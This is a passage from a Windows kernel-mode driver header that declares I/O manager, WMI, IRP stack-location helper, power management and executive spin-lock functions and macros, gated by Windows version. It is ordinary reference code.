  OUT PWSTR *SymbolicLinkList);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDeviceObjectPointer(
  IN PUNICODE_STRING ObjectName,
  IN ACCESS_MASK DesiredAccess,
  OUT PFILE_OBJECT *FileObject,
  OUT PDEVICE_OBJECT *DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDeviceProperty(
  IN PDEVICE_OBJECT DeviceObject,
  IN DEVICE_REGISTRY_PROPERTY DeviceProperty,
  IN ULONG BufferLength,
  OUT PVOID PropertyBuffer,
  OUT PULONG ResultLength);

NTKERNELAPI
PDMA_ADAPTER
NTAPI
IoGetDmaAdapter(
  IN PDEVICE_OBJECT PhysicalDeviceObject OPTIONAL,
  IN PDEVICE_DESCRIPTION DeviceDescription,
  IN OUT PULONG NumberOfMapRegisters);

NTKERNELAPI
PVOID
NTAPI
IoGetDriverObjectExtension(
  IN PDRIVER_OBJECT DriverObject,
  IN PVOID ClientIdentificationAddress);

NTKERNELAPI
PVOID
NTAPI
IoGetInitialStack(VOID);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetRelatedDeviceObject(
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
VOID
NTAPI
IoQueueWorkItem(
  IN PIO_WORKITEM IoWorkItem,
  IN PIO_WORKITEM_ROUTINE WorkerRoutine,
  IN WORK_QUEUE_TYPE QueueType,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoInitializeIrp(
  IN OUT PIRP Irp,
  IN USHORT PacketSize,
  IN CCHAR StackSize);

NTKERNELAPI
VOID
NTAPI
IoInitializeRemoveLockEx(
  IN PIO_REMOVE_LOCK Lock,
  IN ULONG AllocateTag,
  IN ULONG MaxLockedMinutes,
  IN ULONG HighWatermark,
  IN ULONG RemlockSize);

NTKERNELAPI
NTSTATUS
NTAPI
IoInitializeTimer(
  IN PDEVICE_OBJECT DeviceObject,
  IN PIO_TIMER_ROUTINE TimerRoutine,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoInvalidateDeviceRelations(
  IN PDEVICE_OBJECT DeviceObject,
  IN DEVICE_RELATION_TYPE Type);

NTKERNELAPI
VOID
NTAPI
IoInvalidateDeviceState(
  IN PDEVICE_OBJECT PhysicalDeviceObject);

NTKERNELAPI
BOOLEAN
NTAPI
IoIsWdmVersionAvailable(
  IN UCHAR MajorVersion,
  IN UCHAR MinorVersion);

NTKERNELAPI
NTSTATUS
NTAPI
IoOpenDeviceInterfaceRegistryKey(
  IN PUNICODE_STRING SymbolicLinkName,
  IN ACCESS_MASK DesiredAccess,
  OUT PHANDLE DeviceInterfaceKey);

NTKERNELAPI
NTSTATUS
NTAPI
IoOpenDeviceRegistryKey(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG DevInstKeyType,
  IN ACCESS_MASK DesiredAccess,
  OUT PHANDLE DevInstRegKey);

NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterDeviceInterface(
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  IN CONST GUID *InterfaceClassGuid,
  IN PUNICODE_STRING ReferenceString OPTIONAL,
  OUT PUNICODE_STRING SymbolicLinkName);

NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterPlugPlayNotification(
  IN IO_NOTIFICATION_EVENT_CATEGORY EventCategory,
  IN ULONG EventCategoryFlags,
  IN PVOID EventCategoryData OPTIONAL,
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_NOTIFICATION_CALLBACK_ROUTINE CallbackRoutine,
  IN OUT PVOID Context OPTIONAL,
  OUT PVOID *NotificationEntry);

NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterShutdownNotification(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
VOID
NTAPI
IoReleaseCancelSpinLock(
  IN KIRQL Irql);

NTKERNELAPI
VOID
NTAPI
IoReleaseRemoveLockAndWaitEx(
  IN PIO_REMOVE_LOCK RemoveLock,
  IN PVOID Tag OPTIONAL,
  IN ULONG RemlockSize);

NTKERNELAPI
VOID
NTAPI
IoReleaseRemoveLockEx(
  IN PIO_REMOVE_LOCK RemoveLock,
  IN PVOID Tag OPTIONAL,
  IN ULONG RemlockSize);

NTKERNELAPI
VOID
NTAPI
IoRemoveShareAccess(
  IN PFILE_OBJECT FileObject,
  IN OUT PSHARE_ACCESS ShareAccess);

NTKERNELAPI
NTSTATUS
NTAPI
IoReportTargetDeviceChange(
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  IN PVOID NotificationStructure);

NTKERNELAPI
NTSTATUS
NTAPI
IoReportTargetDeviceChangeAsynchronous(
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  IN PVOID NotificationStructure,
  IN PDEVICE_CHANGE_COMPLETE_CALLBACK Callback OPTIONAL,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoRequestDeviceEject(
  IN PDEVICE_OBJECT PhysicalDeviceObject);

NTKERNELAPI
VOID
NTAPI
IoReuseIrp(
  IN OUT PIRP Irp,
  IN NTSTATUS Status);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetDeviceInterfaceState(
  IN PUNICODE_STRING SymbolicLinkName,
  IN BOOLEAN Enable);

NTKERNELAPI
VOID
NTAPI
IoSetShareAccess(
  IN ACCESS_MASK DesiredAccess,
  IN ULONG DesiredShareAccess,
  IN OUT PFILE_OBJECT FileObject,
  OUT PSHARE_ACCESS ShareAccess);

NTKERNELAPI
VOID
NTAPI
IoStartNextPacket(
  IN PDEVICE_OBJECT DeviceObject,
  IN BOOLEAN Cancelable);

NTKERNELAPI
VOID
NTAPI
IoStartNextPacketByKey(
  IN PDEVICE_OBJECT DeviceObject,
  IN BOOLEAN Cancelable,
  IN ULONG Key);

NTKERNELAPI
VOID
NTAPI
IoStartPacket(
  IN PDEVICE_OBJECT DeviceObject,
  IN PIRP Irp,
  IN PULONG Key OPTIONAL,
  IN PDRIVER_CANCEL CancelFunction OPTIONAL);

NTKERNELAPI
VOID
NTAPI
IoStartTimer(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
VOID
NTAPI
IoStopTimer(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoUnregisterPlugPlayNotification(
  IN PVOID NotificationEntry);

NTKERNELAPI
VOID
NTAPI
IoUnregisterShutdownNotification(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
VOID
NTAPI
IoUpdateShareAccess(
  IN PFILE_OBJECT FileObject,
  IN OUT PSHARE_ACCESS ShareAccess);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIAllocateInstanceIds(
  IN GUID *Guid,
  IN ULONG InstanceCount,
  OUT ULONG *FirstInstanceId);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIQuerySingleInstanceMultiple(
  IN PVOID *DataBlockObjectList,
  IN PUNICODE_STRING InstanceNames,
  IN ULONG ObjectCount,
  IN OUT ULONG *InOutBufferSize,
  OUT PVOID OutBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIRegistrationControl(
  IN PDEVICE_OBJECT DeviceObject,
  IN ULONG Action);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMISuggestInstanceName(
  IN PDEVICE_OBJECT PhysicalDeviceObject OPTIONAL,
  IN PUNICODE_STRING SymbolicLinkName OPTIONAL,
  IN BOOLEAN CombineNames,
  OUT PUNICODE_STRING SuggestedInstanceName);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIWriteEvent(
  IN OUT PVOID WnodeEventItem);

NTKERNELAPI
VOID
NTAPI
IoWriteErrorLogEntry(
  IN PVOID ElEntry);

NTKERNELAPI
PIRP
NTAPI
IoGetTopLevelIrp(VOID);

NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterLastChanceShutdownNotification(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
VOID
NTAPI
IoSetTopLevelIrp(
  IN PIRP Irp OPTIONAL);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
NTSTATUS
NTAPI
IoCsqInitialize(
  IN PIO_CSQ Csq,
  IN PIO_CSQ_INSERT_IRP CsqInsertIrp,
  IN PIO_CSQ_REMOVE_IRP CsqRemoveIrp,
  IN PIO_CSQ_PEEK_NEXT_IRP CsqPeekNextIrp,
  IN PIO_CSQ_ACQUIRE_LOCK CsqAcquireLock,
  IN PIO_CSQ_RELEASE_LOCK CsqReleaseLock,
  IN PIO_CSQ_COMPLETE_CANCELED_IRP CsqCompleteCanceledIrp);

NTKERNELAPI
VOID
NTAPI
IoCsqInsertIrp(
  IN PIO_CSQ Csq,
  IN PIRP Irp,
  IN PIO_CSQ_IRP_CONTEXT Context OPTIONAL);

NTKERNELAPI
PIRP
NTAPI
IoCsqRemoveIrp(
  IN PIO_CSQ Csq,
  IN PIO_CSQ_IRP_CONTEXT Context);

NTKERNELAPI
PIRP
NTAPI
IoCsqRemoveNextIrp(
  IN PIO_CSQ Csq,
  IN PVOID PeekContext OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
IoForwardIrpSynchronously(
  IN PDEVICE_OBJECT DeviceObject,
  IN PIRP Irp);

#define IoForwardAndCatchIrp IoForwardIrpSynchronously

NTKERNELAPI
VOID
NTAPI
IoFreeErrorLogEntry(
  PVOID ElEntry);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetCompletionRoutineEx(
  IN PDEVICE_OBJECT DeviceObject,
  IN PIRP Irp,
  IN PIO_COMPLETION_ROUTINE CompletionRoutine,
  IN PVOID Context,
  IN BOOLEAN InvokeOnSuccess,
  IN BOOLEAN InvokeOnError,
  IN BOOLEAN InvokeOnCancel);

VOID
NTAPI
IoSetStartIoAttributes(
  IN PDEVICE_OBJECT DeviceObject,
  IN BOOLEAN DeferredStartIo,
  IN BOOLEAN NonCancelable);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIDeviceObjectToInstanceName(
  IN PVOID DataBlockObject,
  IN PDEVICE_OBJECT DeviceObject,
  OUT PUNICODE_STRING InstanceName);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIExecuteMethod(
  IN PVOID DataBlockObject,
  IN PUNICODE_STRING InstanceName,
  IN ULONG MethodId,
  IN ULONG InBufferSize,
  IN OUT PULONG OutBufferSize,
  IN OUT  PUCHAR InOutBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIHandleToInstanceName(
  IN PVOID DataBlockObject,
  IN HANDLE FileHandle,
  OUT PUNICODE_STRING InstanceName);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIOpenBlock(
  IN GUID *DataBlockGuid,
  IN ULONG DesiredAccess,
  OUT PVOID *DataBlockObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIQueryAllData(
  IN PVOID DataBlockObject,
  IN OUT ULONG *InOutBufferSize,
  OUT PVOID OutBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIQueryAllDataMultiple(
  IN PVOID *DataBlockObjectList,
  IN ULONG ObjectCount,
  IN OUT ULONG *InOutBufferSize,
  OUT PVOID OutBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMIQuerySingleInstance(
  IN PVOID DataBlockObject,
  IN PUNICODE_STRING InstanceName,
  IN OUT ULONG *InOutBufferSize,
  OUT PVOID OutBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMISetNotificationCallback(
  IN OUT PVOID Object,
  IN WMI_NOTIFICATION_CALLBACK Callback,
  IN PVOID Context OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMISetSingleInstance(
  IN PVOID DataBlockObject,
  IN PUNICODE_STRING InstanceName,
  IN ULONG Version,
  IN ULONG ValueBufferSize,
  IN PVOID ValueBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoWMISetSingleItem(
  IN PVOID DataBlockObject,
  IN PUNICODE_STRING InstanceName,
  IN ULONG DataItemId,
  IN ULONG Version,
  IN ULONG ValueBufferSize,
  IN PVOID ValueBuffer);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WINXPSP1)
NTKERNELAPI
NTSTATUS
NTAPI
IoValidateDeviceIoControlAccess(
  IN PIRP Irp,
  IN ULONG RequiredAccess);
#endif

#if (NTDDI_VERSION >= NTDDI_WS03)
NTKERNELAPI
NTSTATUS
NTAPI
IoCsqInitializeEx(
  IN PIO_CSQ Csq,
  IN PIO_CSQ_INSERT_IRP_EX CsqInsertIrp,
  IN PIO_CSQ_REMOVE_IRP CsqRemoveIrp,
  IN PIO_CSQ_PEEK_NEXT_IRP CsqPeekNextIrp,
  IN PIO_CSQ_ACQUIRE_LOCK CsqAcquireLock,
  IN PIO_CSQ_RELEASE_LOCK CsqReleaseLock,
  IN PIO_CSQ_COMPLETE_CANCELED_IRP CsqCompleteCanceledIrp);

NTKERNELAPI
NTSTATUS
NTAPI
IoCsqInsertIrpEx(
  IN PIO_CSQ Csq,
  IN PIRP Irp,
  IN PIO_CSQ_IRP_CONTEXT Context OPTIONAL,
  IN PVOID InsertContext OPTIONAL);
#endif /* (NTDDI_VERSION >= NTDDI_WS03) */


#if (NTDDI_VERSION >= NTDDI_VISTA)
NTKERNELAPI
NTSTATUS
NTAPI
IoGetBootDiskInformationLite(
  OUT PBOOTDISK_INFORMATION_LITE *BootDiskInformation);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckShareAccessEx(
  IN ACCESS_MASK DesiredAccess,
  IN ULONG DesiredShareAccess,
  IN OUT PFILE_OBJECT FileObject,
  IN OUT PSHARE_ACCESS ShareAccess,
  IN BOOLEAN Update,
  IN PBOOLEAN WritePermission);

NTKERNELAPI
NTSTATUS
NTAPI
IoConnectInterruptEx(
  IN OUT PIO_CONNECT_INTERRUPT_PARAMETERS Parameters);

NTKERNELAPI
VOID
NTAPI
IoDisconnectInterruptEx(
  IN PIO_DISCONNECT_INTERRUPT_PARAMETERS Parameters);

LOGICAL
NTAPI
IoWithinStackLimits(
  IN ULONG_PTR RegionStart,
  IN SIZE_T RegionSize);

NTKERNELAPI
VOID
NTAPI
IoSetShareAccessEx(
  IN ACCESS_MASK DesiredAccess,
  IN ULONG DesiredShareAccess,
  IN OUT PFILE_OBJECT FileObject,
  OUT PSHARE_ACCESS ShareAccess,
  IN PBOOLEAN WritePermission);

ULONG
NTAPI
IoSizeofWorkItem(VOID);

VOID
NTAPI
IoInitializeWorkItem(
  IN PVOID IoObject,
  IN PIO_WORKITEM IoWorkItem);

VOID
NTAPI
IoUninitializeWorkItem(
  IN PIO_WORKITEM IoWorkItem);

VOID
NTAPI
IoQueueWorkItemEx(
  IN PIO_WORKITEM IoWorkItem,
  IN PIO_WORKITEM_ROUTINE_EX WorkerRoutine,
  IN WORK_QUEUE_TYPE QueueType,
  IN PVOID Context OPTIONAL);

IO_PRIORITY_HINT
NTAPI
IoGetIoPriorityHint(
  IN PIRP Irp);

NTSTATUS
NTAPI
IoSetIoPriorityHint(
  IN PIRP Irp,
  IN IO_PRIORITY_HINT PriorityHint);

NTSTATUS
NTAPI
IoAllocateSfioStreamIdentifier(
  IN PFILE_OBJECT FileObject,
  IN ULONG Length,
  IN PVOID Signature,
  OUT PVOID *StreamIdentifier);

PVOID
NTAPI
IoGetSfioStreamIdentifier(
  IN PFILE_OBJECT FileObject,
  IN PVOID Signature);

NTSTATUS
NTAPI
IoFreeSfioStreamIdentifier(
  IN PFILE_OBJECT FileObject,
  IN PVOID Signature);

NTKERNELAPI
NTSTATUS
NTAPI
IoRequestDeviceEjectEx(
  IN PDEVICE_OBJECT PhysicalDeviceObject,
  IN PIO_DEVICE_EJECT_CALLBACK Callback OPTIONAL,
  IN PVOID Context OPTIONAL,
  IN PDRIVER_OBJECT DriverObject OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetDevicePropertyData(
  IN PDEVICE_OBJECT     Pdo,
  IN CONST DEVPROPKEY   *PropertyKey,
  IN LCID               Lcid,
  IN ULONG              Flags,
  IN DEVPROPTYPE        Type,
  IN ULONG              Size,
  IN PVOID          Data OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDevicePropertyData(
  PDEVICE_OBJECT Pdo,
  CONST DEVPROPKEY *PropertyKey,
  LCID Lcid,
  ULONG Flags,
  ULONG Size,
  PVOID Data,
  PULONG RequiredSize,
  PDEVPROPTYPE Type);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#define IoCallDriverStackSafeDefault(a, b) IoCallDriver(a, b)

#if (NTDDI_VERSION >= NTDDI_WS08)
NTKERNELAPI
NTSTATUS
NTAPI
IoReplacePartitionUnit(
  IN PDEVICE_OBJECT TargetPdo,
  IN PDEVICE_OBJECT SparePdo,
  IN ULONG Flags);
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
NTSTATUS
NTAPI
IoGetAffinityInterrupt(
  IN PKINTERRUPT InterruptObject,
  OUT PGROUP_AFFINITY GroupAffinity);

NTSTATUS
NTAPI
IoGetContainerInformation(
  IN IO_CONTAINER_INFORMATION_CLASS InformationClass,
  IN PVOID ContainerObject OPTIONAL,
  IN OUT PVOID Buffer OPTIONAL,
  IN ULONG BufferLength);

NTSTATUS
NTAPI
IoRegisterContainerNotification(
  IN IO_CONTAINER_NOTIFICATION_CLASS NotificationClass,
  IN PIO_CONTAINER_NOTIFICATION_FUNCTION CallbackFunction,
  IN PVOID NotificationInformation OPTIONAL,
  IN ULONG NotificationInformationLength,
  OUT PVOID CallbackRegistration);

VOID
NTAPI
IoUnregisterContainerNotification(
  IN PVOID CallbackRegistration);

NTKERNELAPI
NTSTATUS
NTAPI
IoUnregisterPlugPlayNotificationEx(
  IN PVOID NotificationEntry);

NTKERNELAPI
NTSTATUS
NTAPI
IoGetDeviceNumaNode(
  IN PDEVICE_OBJECT Pdo,
  OUT PUSHORT NodeNumber);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#if defined(_WIN64)
NTKERNELAPI
ULONG
NTAPI
IoWMIDeviceObjectToProviderId(
  IN PDEVICE_OBJECT DeviceObject);
#else
#define IoWMIDeviceObjectToProviderId(DeviceObject) ((ULONG)(DeviceObject))
#endif

/*
 * USHORT
 * IoSizeOfIrp(
 *   IN CCHAR  StackSize)
 */
#define IoSizeOfIrp(_StackSize) \
  ((USHORT) (sizeof(IRP) + ((_StackSize) * (sizeof(IO_STACK_LOCATION)))))

FORCEINLINE
VOID
IoSkipCurrentIrpStackLocation(
  IN OUT PIRP Irp)
{
  ASSERT(Irp->CurrentLocation <= Irp->StackCount);
  Irp->CurrentLocation++;
#ifdef NONAMELESSUNION
  Irp->Tail.Overlay.s.u.CurrentStackLocation++;
#else
  Irp->Tail.Overlay.CurrentStackLocation++;
#endif
}

FORCEINLINE
VOID
IoSetNextIrpStackLocation(
  IN OUT PIRP Irp)
{
  ASSERT(Irp->CurrentLocation > 0);
  Irp->CurrentLocation--;
#ifdef NONAMELESSUNION
  Irp->Tail.Overlay.s.u.CurrentStackLocation--;
#else
  Irp->Tail.Overlay.CurrentStackLocation--;
#endif
}

FORCEINLINE
PIO_STACK_LOCATION
IoGetNextIrpStackLocation(
  IN PIRP Irp)
{
  ASSERT(Irp->CurrentLocation > 0);
#ifdef NONAMELESSUNION
  return ((Irp)->Tail.Overlay.s.u.CurrentStackLocation - 1 );
#else
  return ((Irp)->Tail.Overlay.CurrentStackLocation - 1 );
#endif
}

FORCEINLINE
VOID
IoSetCompletionRoutine(
  IN PIRP Irp,
  IN PIO_COMPLETION_ROUTINE CompletionRoutine OPTIONAL,
  IN PVOID Context OPTIONAL,
  IN BOOLEAN InvokeOnSuccess,
  IN BOOLEAN InvokeOnError,
  IN BOOLEAN InvokeOnCancel)
{
  PIO_STACK_LOCATION irpSp;
  ASSERT( (InvokeOnSuccess || InvokeOnError || InvokeOnCancel) ? (CompletionRoutine != NULL) : TRUE );
  irpSp = IoGetNextIrpStackLocation(Irp);
  irpSp->CompletionRoutine = CompletionRoutine;
  irpSp->Context = Context;
  irpSp->Control = 0;

  if (InvokeOnSuccess) {
    irpSp->Control = SL_INVOKE_ON_SUCCESS;
  }

  if (InvokeOnError) {
    irpSp->Control |= SL_INVOKE_ON_ERROR;
  }

  if (InvokeOnCancel) {
    irpSp->Control |= SL_INVOKE_ON_CANCEL;
  }
}

/*
 * PDRIVER_CANCEL
 * IoSetCancelRoutine(
 *   IN PIRP  Irp,
 *   IN PDRIVER_CANCEL  CancelRoutine)
 */
#define IoSetCancelRoutine(_Irp, \
                           _CancelRoutine) \
  ((PDRIVER_CANCEL) (ULONG_PTR) InterlockedExchangePointer( \
    (PVOID *) &(_Irp)->CancelRoutine, (PVOID) (ULONG_PTR) (_CancelRoutine)))

/*
 * VOID
 * IoRequestDpc(
 *   IN PDEVICE_OBJECT  DeviceObject,
 *   IN PIRP  Irp,
 *   IN PVOID  Context);
 */
#define IoRequestDpc(DeviceObject, Irp, Context)( \
  KeInsertQueueDpc(&(DeviceObject)->Dpc, (Irp), (Context)))

/*
 * VOID
 * IoReleaseRemoveLock(
 *   IN PIO_REMOVE_LOCK  RemoveLock,
 *   IN PVOID  Tag)
 */
#define IoReleaseRemoveLock(_RemoveLock, \
                            _Tag) \
  IoReleaseRemoveLockEx(_RemoveLock, _Tag, sizeof(IO_REMOVE_LOCK))

/*
 * VOID
 * IoReleaseRemoveLockAndWait(
 *   IN PIO_REMOVE_LOCK  RemoveLock,
 *   IN PVOID  Tag)
 */
#define IoReleaseRemoveLockAndWait(_RemoveLock, \
                                   _Tag) \
  IoReleaseRemoveLockAndWaitEx(_RemoveLock, _Tag, sizeof(IO_REMOVE_LOCK))

#if defined(_WIN64)
NTKERNELAPI
BOOLEAN
IoIs32bitProcess(
  IN PIRP Irp OPTIONAL);
#endif

#define PLUGPLAY_REGKEY_DEVICE                            1
#define PLUGPLAY_REGKEY_DRIVER                            2
#define PLUGPLAY_REGKEY_CURRENT_HWPROFILE                 4

FORCEINLINE
PIO_STACK_LOCATION
IoGetCurrentIrpStackLocation(
  IN PIRP Irp)
{
  ASSERT(Irp->CurrentLocation <= Irp->StackCount + 1);
#ifdef NONAMELESSUNION
  return Irp->Tail.Overlay.s.u.CurrentStackLocation;
#else
  return Irp->Tail.Overlay.CurrentStackLocation;
#endif
}

FORCEINLINE
VOID
IoMarkIrpPending(
  IN OUT PIRP Irp)
{
  IoGetCurrentIrpStackLocation( (Irp) )->Control |= SL_PENDING_RETURNED;
}

/*
 * BOOLEAN
 * IoIsErrorUserInduced(
 *   IN NTSTATUS  Status);
 */
#define IoIsErrorUserInduced(Status) \
   ((BOOLEAN)(((Status) == STATUS_DEVICE_NOT_READY) || \
   ((Status) == STATUS_IO_TIMEOUT) || \
   ((Status) == STATUS_MEDIA_WRITE_PROTECTED) || \
   ((Status) == STATUS_NO_MEDIA_IN_DEVICE) || \
   ((Status) == STATUS_VERIFY_REQUIRED) || \
   ((Status) == STATUS_UNRECOGNIZED_MEDIA) || \
   ((Status) == STATUS_WRONG_VOLUME)))

/* VOID
 * IoInitializeRemoveLock(
 *   IN PIO_REMOVE_LOCK  Lock,
 *   IN ULONG  AllocateTag,
 *   IN ULONG  MaxLockedMinutes,
 *   IN ULONG  HighWatermark)
 */
#define IoInitializeRemoveLock( \
  Lock, AllocateTag, MaxLockedMinutes, HighWatermark) \
  IoInitializeRemoveLockEx(Lock, AllocateTag, MaxLockedMinutes, \
    HighWatermark, sizeof(IO_REMOVE_LOCK))

FORCEINLINE
VOID
IoInitializeDpcRequest(
  IN PDEVICE_OBJECT DeviceObject,
  IN PIO_DPC_ROUTINE DpcRoutine)
{
  KeInitializeDpc( &DeviceObject->Dpc,
                   (PKDEFERRED_ROUTINE) DpcRoutine,
                   DeviceObject );
}

#define DEVICE_INTERFACE_INCLUDE_NONACTIVE 0x00000001

/*
 * ULONG
 * IoGetFunctionCodeFromCtlCode(
 *   IN ULONG  ControlCode)
 */
#define IoGetFunctionCodeFromCtlCode(_ControlCode) \
  (((_ControlCode) >> 2) & 0x00000FFF)

FORCEINLINE
VOID
IoCopyCurrentIrpStackLocationToNext(
  IN OUT PIRP Irp)
{
  PIO_STACK_LOCATION irpSp;
  PIO_STACK_LOCATION nextIrpSp;
  irpSp = IoGetCurrentIrpStackLocation(Irp);
  nextIrpSp = IoGetNextIrpStackLocation(Irp);
  RtlCopyMemory( nextIrpSp, irpSp, FIELD_OFFSET(IO_STACK_LOCATION, CompletionRoutine));
  nextIrpSp->Control = 0;
}

NTKERNELAPI
VOID
NTAPI
IoGetStackLimits(
  OUT PULONG_PTR LowLimit,
  OUT PULONG_PTR HighLimit);

FORCEINLINE
ULONG_PTR
IoGetRemainingStackSize(VOID)
{
  ULONG_PTR End, Begin;
  ULONG_PTR Result;

  IoGetStackLimits(&Begin, &End);
  Result = (ULONG_PTR)(&End) - Begin;
  return Result;
}

#if (NTDDI_VERSION >= NTDDI_WS03)
FORCEINLINE
VOID
IoInitializeThreadedDpcRequest(
  IN PDEVICE_OBJECT DeviceObject,
  IN PIO_DPC_ROUTINE DpcRoutine)
{
  KeInitializeThreadedDpc(&DeviceObject->Dpc,
                          (PKDEFERRED_ROUTINE) DpcRoutine,
                          DeviceObject );
}
#endif

/******************************************************************************
 *                     Power Management Support Functions                     *
 ******************************************************************************/

#define PoSetDeviceBusy(IdlePointer) ((void)(*(IdlePointer) = 0))

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
NTSTATUS
NTAPI
PoCallDriver(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN OUT struct _IRP *Irp);

NTKERNELAPI
PULONG
NTAPI
PoRegisterDeviceForIdleDetection(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN ULONG ConservationIdleTime,
  IN ULONG PerformanceIdleTime,
  IN DEVICE_POWER_STATE State);

NTKERNELAPI
PVOID
NTAPI
PoRegisterSystemState(
  IN OUT PVOID StateHandle OPTIONAL,
  IN EXECUTION_STATE Flags);

NTKERNELAPI
NTSTATUS
NTAPI
PoRequestPowerIrp(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN UCHAR MinorFunction,
  IN POWER_STATE PowerState,
  IN PREQUEST_POWER_COMPLETE CompletionFunction OPTIONAL,
  IN PVOID Context OPTIONAL,
  OUT struct _IRP **Irp OPTIONAL);

NTKERNELAPI
POWER_STATE
NTAPI
PoSetPowerState(
  IN struct _DEVICE_OBJECT *DeviceObject,
  IN POWER_STATE_TYPE Type,
  IN POWER_STATE State);

NTKERNELAPI
VOID
NTAPI
PoSetSystemState(
  IN EXECUTION_STATE Flags);

NTKERNELAPI
VOID
NTAPI
PoStartNextPowerIrp(
  IN OUT struct _IRP *Irp);

NTKERNELAPI
VOID
NTAPI
PoUnregisterSystemState(
  IN OUT PVOID StateHandle);

NTKERNELAPI
NTSTATUS
NTAPI
PoRequestShutdownEvent(
  OUT PVOID *Event);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
VOID
NTAPI
PoSetSystemWake(
  IN OUT struct _IRP *Irp);

NTKERNELAPI
BOOLEAN
NTAPI
PoGetSystemWake(
  IN struct _IRP *Irp);

NTKERNELAPI
NTSTATUS
NTAPI
PoRegisterPowerSettingCallback(
  IN PDEVICE_OBJECT DeviceObject OPTIONAL,
  IN LPCGUID SettingGuid,
  IN PPOWER_SETTING_CALLBACK Callback,
  IN PVOID Context OPTIONAL,
  OUT PVOID *Handle OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
PoUnregisterPowerSettingCallback(
  IN OUT PVOID Handle);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_VISTASP1)
NTKERNELAPI
VOID
NTAPI
PoSetDeviceBusyEx(
  IN OUT PULONG IdlePointer);
#endif /* (NTDDI_VERSION >= NTDDI_VISTASP1) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
VOID
NTAPI
PoStartDeviceBusy(
  IN OUT PULONG IdlePointer);

NTKERNELAPI
VOID
NTAPI
PoEndDeviceBusy(
  IN OUT PULONG IdlePointer);

NTKERNELAPI
BOOLEAN
NTAPI
PoQueryWatchdogTime(
  IN PDEVICE_OBJECT Pdo,
  OUT PULONG SecondsRemaining);

NTKERNELAPI
VOID
NTAPI
PoDeletePowerRequest(
  IN OUT PVOID PowerRequest);

NTKERNELAPI
NTSTATUS
NTAPI
PoSetPowerRequest(
  IN OUT PVOID PowerRequest,
  IN POWER_REQUEST_TYPE Type);

NTKERNELAPI
NTSTATUS
NTAPI
PoClearPowerRequest(
  IN OUT PVOID PowerRequest,
  IN POWER_REQUEST_TYPE Type);

NTKERNELAPI
NTSTATUS
NTAPI
PoCreatePowerRequest(
  OUT PVOID *PowerRequest,
  IN PDEVICE_OBJECT DeviceObject,
  IN PCOUNTED_REASON_CONTEXT Context);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

/******************************************************************************
 *                          Executive Functions                               *
 ******************************************************************************/

#define ExInterlockedIncrementLong(Addend,Lock) Exfi386InterlockedIncrementLong(Addend)
#define ExInterlockedDecrementLong(Addend,Lock) Exfi386InterlockedDecrementLong(Addend)
#define ExInterlockedExchangeUlong(Target, Value, Lock) Exfi386InterlockedExchangeUlong(Target, Value)

#define ExAcquireSpinLock(Lock, OldIrql) KeAcquireSpinLock((Lock), (OldIrql))
#define ExReleaseSpinLock(Lock, OldIrql) KeReleaseSpinLock((Lock), (OldIrql))
